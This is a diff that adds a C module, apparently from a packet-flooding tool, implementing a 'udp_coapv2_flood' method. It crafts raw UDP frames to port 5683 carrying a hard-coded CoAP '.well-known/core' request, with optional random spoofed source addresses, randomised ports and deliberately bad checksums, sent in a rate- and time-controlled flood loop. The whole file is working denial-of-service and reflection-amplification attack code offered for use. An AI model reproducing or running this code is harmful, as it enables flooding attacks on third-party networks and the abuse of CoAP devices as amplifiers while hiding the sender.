@@ -1,0 +1,61 @@
+#include "../../include/methods.h"
+
+static struct udphdr		*udp;
+static struct iphdr		*ip;
+static u_char			frame[65535];
+
+static u_char PAYLOAD[]="\x44\x01\x0f\x3c\xd1"
+	"\x97\x96\xc1\xc1\x3c\xff\x00\x00\x40"
+	"\x01\x01\x01\xbb\x2e\x77\x65\x6c\x6c"
+	"\x2d\x6b\x6e\x6f\x77\x6e\x04\x63\x6f"
+	"\x72\x65";
+
+static void inline for_iteration(method_args_t *a)
+{
+	/* not dstport */
+	if (a->o->OPT_SOURCE[0]=='\a')
+		ip->saddr=random_ipv4();
+	udp->uh_sport=(a->o->OPT_SRCPORT==ARANDVAL)?
+		htons(random_u16()):htons(a->o->OPT_SRCPORT);
+	ip->id=htons(random_u16());
+
+	ip->check=0;
+	ip->check=in_check((u_short*)ip,sizeof(*ip));
+
+	udp->uh_sum=0;
+	udp->uh_sum=ip4_pseudocheck(ip->saddr,ip->daddr,
+		IPPROTO_UDP,(ntohs(udp->uh_ulen)),udp);
+
+	if (a->o->OPT_BADSUM==ARANDVAL) {
+		if (randnum(0,1)==0)
+			--udp->uh_sum;
+	}
+	else if (a->o->OPT_BADSUM==1)
+		--udp->uh_sum;
+}
+
+void udp_coapv2_flood(method_args_t *a)
+{
+	memset(frame,0,sizeof(frame));
+	memcpy(frame,a->machdr,14);
+	ip=(struct iphdr*)(frame+14);
+	udp=(struct udphdr*)(frame+14+(sizeof(struct iphdr)));
+
+	ip->ihl=5;
+	ip->version=4;
+	ip->tos=0;
+	ip->ttl=100;
+	ip->frag_off=0;
+	ip->protocol=IPPROTO_UDP;
+	ip->saddr=a->source;
+	ip->daddr=a->target;
+	ip->tot_len=htons((sizeof(struct iphdr)+
+		sizeof(struct udphdr))+(sizeof(PAYLOAD)-1));
+	udp->uh_ulen=htons(sizeof(struct udphdr)+(sizeof(PAYLOAD)-1));
+	udp->uh_dport=htons(5683);
+	memcpy((frame+14+(sizeof(struct udphdr)+sizeof(struct iphdr))),
+		PAYLOAD,(sizeof(PAYLOAD)-1));
+
+	FLOODRUN(a,for_iteration(a),ethsend(a->fd,frame,ntohs(ip->tot_len)+14),
+		a->o->OPT_PPS,a->o->OPT_TIME,a->o->OPT_UNLIMIT);
+}
